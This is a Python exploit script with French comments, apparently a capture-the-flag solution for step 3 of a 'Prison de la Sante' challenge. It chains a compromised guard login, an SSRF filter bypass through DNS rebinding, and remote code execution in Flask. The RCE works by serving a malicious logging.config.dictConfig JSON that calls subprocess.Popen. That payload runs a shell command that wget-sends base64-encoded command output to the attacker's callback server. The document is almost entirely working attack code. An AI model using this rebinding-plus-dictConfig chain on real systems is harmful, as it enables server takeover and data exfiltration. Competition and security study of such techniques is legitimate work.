#!/usr/bin/env python3
"""
step3.py — Escape from "Prison de la Sante"
SSRF via DNS Rebinding + RCE Flask via logging.config.dictConfig().

Prerequis :
  - Compte gardien compromis (step1.py) -> mot de passe du gardien
  - Code d'activation FLUX-<hex> (step2.py)
  - IP attaquant joignable depuis le serveur cible (depuis Node.js + Flask)

Chaine (par tentative) :
  0. Connexion au compte gardien b.bellick (mot de passe defini par step1.py)
  1. Demarrage d'un serveur HTTP local (sert evil.json, capture /flag)
  2. Pour chaque tentative :
       a. Generation d'un prefix random pour le domaine de rebind
          (evite la mise en cache du resolveur recursif cote backend)
       b. Enregistrement d'un feed avec ce domaine
       c. fetchExternalFeed avec le code d'activation
          -> dns.resolve4() voit 1.2.3.4 (filtre OK)
          -> fetch() voit 127.0.0.1 apres rebinding (atteint Flask :5000)
          -> Flask telecharge evil.json depuis l'attaquant
          -> dictConfig() instancie subprocess.Popen -> /getflag | exfiltration

Usage :
  python3 step3.py --target http://challenge.ctf:PORT \
                   --attacker <IP_ATTAQUANT> \
                   --code FLUX-<hex>

  # Mot de passe gardien optionnel (defaut : CTFsolve_2026! defini par step1.py) :
  python3 step3.py ... --guard-password <MOT_DE_PASSE>

  # Port local optionnel (defaut 1337) :
  python3 step3.py ... --port 1337
"""

import argparse
import base64
import http.server
import json
import secrets
import sys
import threading
import time
import urllib.parse

import requests

FLAG = None


# ---------------------------------------------------------------------------
# Serveur HTTP local
# ---------------------------------------------------------------------------

def build_evil_json(attacker_ip, attacker_port):
    cmd = f"wget -qO- \"http://{attacker_ip}:{attacker_port}/flag?f=$(/getflag | base64 -w0)\""
    return {
        "version": 1,
        "disable_existing_loggers": False,
        "handlers": {
            "exfil": {
                "()": "subprocess.Popen",
                "args": ["sh", "-c", cmd],
            }
        },
        "root": {
            "level": "DEBUG",
            "handlers": ["exfil"],
        },
    }


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        global FLAG
        parsed = urllib.parse.urlparse(self.path)

        if parsed.path == "/evil.json":
            payload = build_evil_json(self.server.attacker_ip, self.server.attacker_port)
            body = json.dumps(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print("      [HTTP] evil.json servi")

        elif parsed.path == "/flag":
            params = urllib.parse.parse_qs(parsed.query)
            encoded = params.get("f", [""])[0]
            try:
                FLAG = base64.b64decode(encoded + "==").decode().strip()
            except Exception:
                FLAG = encoded
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            print(f"\n[+] FLAG recu : {FLAG}")

        else:
            self.send_response(404)
            self.end_headers()


def start_http_server(attacker_ip, port):
    server = http.server.HTTPServer(("0.0.0.0", port), CallbackHandler)
    server.attacker_ip = attacker_ip
    server.attacker_port = port
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[*] Serveur HTTP en ecoute sur :{port}")
    return server


# ---------------------------------------------------------------------------
# Auth helper
# ---------------------------------------------------------------------------

GUARD_USERNAME = "b.bellick"
DEFAULT_GUARD_PASSWORD = "CTFsolve_2026!"


def login_guard(session, target, password):
    """Authentifie le gardien b.bellick et retourne son JWT."""
    print(f"[0/3] Connexion en tant que {GUARD_USERNAME}")
    resp = session.post(
        f"{target}/api/auth/login",
        json={"username": GUARD_USERNAME, "password": password},
        timeout=15,
    )
    resp.raise_for_status()
    j = resp.json()
    if "token" not in j:
        raise RuntimeError(f"Login gardien echoue : {j}")
    jwt = j["token"]
    print(f"      JWT obtenu : {jwt[:48]}...")
    return jwt


# ---------------------------------------------------------------------------
# GraphQL helper
# ---------------------------------------------------------------------------

def gql(session, target, query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = {"query": query}
    if variables:
        body["variables"] = variables
    resp = session.post(f"{target}/graphql", json=body, headers=headers, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(f"GraphQL error: {data['errors']}")
    return data["data"]


# ---------------------------------------------------------------------------
# Etapes
# ---------------------------------------------------------------------------

def _build_feed_url(attacker_ip, attacker_port, prefix):
    rebind_host = f"{prefix}.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms"
    evil_url    = f"http://{attacker_ip}:{attacker_port}/evil.json"
    ssrf_path   = f"/parametres/api/config/reload?url={urllib.parse.quote(evil_url, safe='')}"
    feed_url    = f"http://{rebind_host}:5000{ssrf_path}"
    return rebind_host, feed_url


def _register_feed(session, target, guard_jwt, feed_url, name):
    data = gql(
        session, target,
        """
          mutation AddFeed($name: String!, $url: String!, $type: String) {
            addExternalFeed(name: $name, url: $url, type: $type) { id name }
          }
        """,
        variables={"name": name, "url": feed_url, "type": "json"},
        token=guard_jwt,
    )
    return data["addExternalFeed"]["id"]


def step2_trigger_ssrf(session, target, guard_jwt, activation_code, attacker_ip, attacker_port, max_attempts=20):
    # Strategie : prefixe aleatoire par tentative pour eviter le cache du resolveur
    # recursif cote backend, qui fige le 2e lookup sur la meme IP que le 1er. Sans ca,
    # `dns.resolve4` et `dns.lookup` retournent toujours la meme IP -> pas de TOCTOU.
    print(f"[1/2] SSRF + DNS Rebinding — declenchement (jusqu'a {max_attempts} tentatives)")
    print(f"      Strategie : nouveau feed avec prefix aleatoire par tentative")

    for attempt in range(1, max_attempts + 1):
        prefix = secrets.token_hex(4)
        rebind_host, feed_url = _build_feed_url(attacker_ip, attacker_port, prefix)
        print(f"      Tentative {attempt}/{max_attempts} ({rebind_host})...", end=" ", flush=True)
        try:
            feed_id = _register_feed(session, target, guard_jwt, feed_url, f"DAP-{prefix}")
            data = gql(
                session, target,
                """
                  mutation Fetch($feedId: ID!, $code: String!) {
                    fetchExternalFeed(feedId: $feedId, activationCode: $code) {
                      success statusCode preview error
                    }
                  }
                """,
                variables={"feedId": feed_id, "code": activation_code},
                token=guard_jwt,
            )
            r = data["fetchExternalFeed"]
            print(f"success={r['success']} http={r.get('statusCode')} err={r.get('error')}")
        except Exception as e:
            print(f"erreur reseau: {e}")

        # Le callback /flag peut arriver apres le retour de fetchExternalFeed
        for _ in range(20):
            if FLAG:
                return True
            time.sleep(0.25)

    return False


def step3_wait_flag(timeout=15):
    print(f"[2/2] En attente du callback flag ({timeout}s max)...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        if FLAG:
            return FLAG
        time.sleep(0.5)
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(description="Step 3 — SSRF + DNS Rebinding + RCE Flask")
    parser.add_argument("--target",         required=True,  help="URL du challenge, ex. http://10.0.0.1:3000")
    parser.add_argument("--attacker",       required=True,  help="IP publique de l'attaquant, ex. 1.2.3.4")
    parser.add_argument("--guard-password", default=DEFAULT_GUARD_PASSWORD,
                                            help=f"Mot de passe du gardien b.bellick (defaut: {DEFAULT_GUARD_PASSWORD})")
    parser.add_argument("--code",           required=True,  help="Code d'activation FLUX-<hex> (obtenu via step2.py)")
    parser.add_argument("--port",           type=int, default=1337,
                                            help="Port HTTP local pour evil.json + callback (defaut: 1337)")
    parser.add_argument("--attempts",       type=int, default=20,
                                            help="Nombre max de tentatives de rebinding (defaut: 20)")
    return parser.parse_args()


def main():
    args = parse_args()
    target          = args.target.rstrip("/")
    attacker_ip     = args.attacker
    attacker_port   = args.port
    guard_password  = args.guard_password
    activation_code = args.code

    print(f"[*] Cible        : {target}")
    print(f"[*] Attaquant    : {attacker_ip}:{attacker_port}")
    print(f"[*] Code         : {activation_code}\n")

    session = requests.Session()
    guard_jwt = login_guard(session, target, guard_password)
    print()

    start_http_server(attacker_ip, attacker_port)

    success = step2_trigger_ssrf(session, target, guard_jwt, activation_code, attacker_ip, attacker_port, args.attempts)

    if not success:
        flag = step3_wait_flag(timeout=15)
    else:
        flag = FLAG

    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG : {flag}")
        print(f"{'='*60}\n")
    else:
        print("\n[-] Flag non recu.")
        sys.exit(1)


if __name__ == "__main__":
    main()
